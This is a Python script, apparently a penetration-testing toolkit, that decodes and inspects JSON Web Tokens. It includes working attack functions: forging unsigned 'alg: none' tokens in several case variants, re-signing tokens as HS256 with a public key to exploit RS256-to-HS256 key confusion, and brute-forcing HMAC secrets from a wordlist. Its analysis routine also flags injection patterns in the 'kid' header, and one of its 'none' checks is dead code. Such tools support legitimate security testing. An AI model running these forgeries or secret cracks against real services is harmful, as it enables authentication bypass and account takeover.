#!/usr/bin/env python3
"""
JWT Analyzer — JWT token security analysis toolkit.

Decode, analyze, and test JWT tokens for common vulnerabilities:
  - alg:none signature bypass
  - RS256→HS256 key confusion
  - kid header injection
  - Weak HMAC secret detection
  - Token claims inspection

Usage:
  python3 jwt-analyzer.py <token>                    # Decode & analyze
  python3 jwt-analyzer.py <token> --test-none         # Test alg:none
  python3 jwt-analyzer.py <token> --test-rs2hs <key>  # Test RS→HS confusion
  python3 jwt-analyzer.py <token> --brute <wordlist>  # Brute-force HS secret
"""

import sys
import json
import base64
import hmac
import hashlib
import argparse
from urllib.parse import quote, unquote

def b64decode(data: str) -> bytes:
    data = data.strip().replace('-', '+').replace('_', '/')
    pad = 4 - len(data) % 4
    if pad != 4:
        data += '=' * pad
    return base64.b64decode(data)

def b64encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def decode_jwt(token: str) -> tuple:
    parts = token.strip().split('.')
    if len(parts) != 3:
        raise ValueError(f"Invalid JWT: expected 3 parts, got {len(parts)}")
    header = json.loads(b64decode(parts[0]))
    payload = json.loads(b64decode(parts[1]))
    return header, payload, parts[2], parts[0], parts[1]

def analyze(token: str):
    """Decode and display JWT with security analysis."""
    try:
        header, payload, sig, h_raw, p_raw = decode_jwt(token)
    except Exception as e:
        print(f"[!] Failed to decode: {e}")
        return

    print("=" * 60)
    print("HEADER")
    print("=" * 60)
    print(json.dumps(header, indent=2))

    print("\n" + "=" * 60)
    print("PAYLOAD")
    print("=" * 60)
    print(json.dumps(payload, indent=2))

    print("\n" + "=" * 60)
    print("SIGNATURE (first 32 chars)")
    print("=" * 60)
    print(sig[:32] + ("..." if len(sig) > 32 else ""))

    # Security analysis
    print("\n" + "=" * 60)
    print("SECURITY ANALYSIS")
    print("=" * 60)

    alg = header.get('alg', 'unknown')

    # Check alg:none
    if alg.lower() == 'none':
        print("⚠️  CRITICAL: alg='none' — signature verification disabled!")
    elif alg.lower() in ('none', 'none'):
        print("⚠️  HIGH: alg case variation may bypass filters")

    # Check algorithm
    if alg.startswith('HS'):
        print(f"ℹ️  HMAC-based ({alg}) — check for weak secret")
    elif alg.startswith('RS') or alg.startswith('ES') or alg.startswith('PS'):
        print(f"ℹ️  Asymmetric ({alg}) — check for RS→HS confusion")
    else:
        print(f"ℹ️  Algorithm: {alg}")

    # Check kid header
    if 'kid' in header:
        kid = header['kid']
        print(f"⚠️  kid header present: '{kid}'")
        if '../' in kid or kid.startswith('/'):
            print("   🚨 Potential path traversal in kid!")
        if '|' in kid or ';' in kid or '&&' in kid:
            print("   🚨 Potential command injection in kid!")

    # Check jku/jwk
    if 'jku' in header:
        print(f"⚠️  jku header: {header['jku']} (verify URL is trusted)")
    if 'jwk' in header:
        print(f"⚠️  jwk header present (self-signed key injection vector)")

    # Check exp
    import time
    if 'exp' in payload:
        exp = int(payload['exp'])
        remaining = exp - int(time.time())
        if remaining < 0:
            print(f"📛 Token EXPIRED {abs(remaining)}s ago")
        else:
            print(f"✅ Token valid for {remaining}s (exp: {time.ctime(exp)})")

    # Check nbf
    if 'nbf' in payload:
        nbf = int(payload['nbf'])
        if time.time() < nbf:
            print(f"⏳ Token not yet valid (nbf: {time.ctime(nbf)})")

    # Check common weak claims
    if 'sub' in payload:
        print(f"👤 Subject: {payload['sub']}")
    if 'role' in payload or 'roles' in payload:
        role = payload.get('role') or payload.get('roles')
        print(f"🔑 Role: {role}")
    if 'admin' in str(payload).lower():
        print(f"⚠️  Admin-related claims found in payload")

    # Signature length check
    try:
        sig_bytes = b64decode(sig)
        if alg.startswith('HS256') and len(sig_bytes) != 32:
            print(f"⚠️  Unusual signature length: {len(sig_bytes)} bytes (expected 32 for HS256)")
    except:
        pass

    print("\n[✓] Analysis complete")

def test_none(token: str):
    """Test alg:none bypass."""
    parts = token.strip().split('.')
    header = json.loads(b64decode(parts[0]))
    payload = json.loads(b64decode(parts[1]))

    for variant in ['none', 'None', 'NONE', 'nOne', 'NOne']:
        header['alg'] = variant
        forged = b64encode(json.dumps(header).encode()) + '.' + parts[1] + '.'
        print(f"\n[{variant}] {forged[:80]}...")

def sign_hs256(data: bytes, key: str) -> str:
    return b64encode(hmac.new(key.encode(), data, hashlib.sha256).digest())

def test_rs2hs(token: str, key: str):
    """Test RS256→HS256 key confusion."""
    header, payload, sig, h_raw, p_raw = decode_jwt(token)
    orig_alg = header.get('alg', '?')
    header['alg'] = 'HS256'
    new_header = b64encode(json.dumps(header).encode())
    data = f"{new_header}.{p_raw}".encode()
    new_sig = sign_hs256(data, key)
    forged = f"{new_header}.{p_raw}.{new_sig}"
    print(f"[+] RS256→HS256 forged token ({orig_alg} → HS256, key={key}):")
    print(forged)

def brute_secret(token: str, wordlist: str):
    """Brute-force HMAC secret."""
    header, payload, sig, h_raw, p_raw = decode_jwt(token)
    data = f"{h_raw}.{p_raw}".encode()
    target_sig = b64decode(sig)

    alg = header.get('alg', 'HS256')
    hash_map = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384, 'HS512': hashlib.sha512}
    hash_fn = hash_map.get(alg, hashlib.sha256)

    print(f"[*] Brute-forcing {alg} secret...")
    count = 0
    try:
        with open(wordlist, 'r', errors='ignore') as f:
            for line in f:
                secret = line.strip()
                if not secret:
                    continue
                count += 1
                computed = hmac.new(secret.encode(), data, hash_fn).digest()
                if computed == target_sig:
                    print(f"\n[+] SECRET FOUND: '{secret}' (after {count} attempts)")
                    return secret
        print(f"[-] Secret not found in wordlist ({count} checked)")
    except FileNotFoundError:
        print(f"[!] Wordlist not found: {wordlist}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='JWT Analyzer — security analysis toolkit')
    parser.add_argument('token', nargs='?', help='JWT token to analyze')
    parser.add_argument('--test-none', action='store_true', help='Test alg:none bypass')
    parser.add_argument('--test-rs2hs', metavar='KEY', help='Test RS→HS confusion with public key')
    parser.add_argument('--brute', metavar='WORDLIST', help='Brute-force HMAC secret')
    parser.add_argument('--file', metavar='FILE', help='Read token from file')

    args = parser.parse_args()

    if args.file:
        with open(args.file) as f:
            token = f.read().strip()
    elif args.token:
        token = args.token
    else:
        parser.print_help()
        sys.exit(1)

    if args.test_none:
        test_none(token)
    elif args.test_rs2hs:
        test_rs2hs(token, args.test_rs2hs)
    elif args.brute:
        brute_secret(token, args.brute)
    else:
        analyze(token)
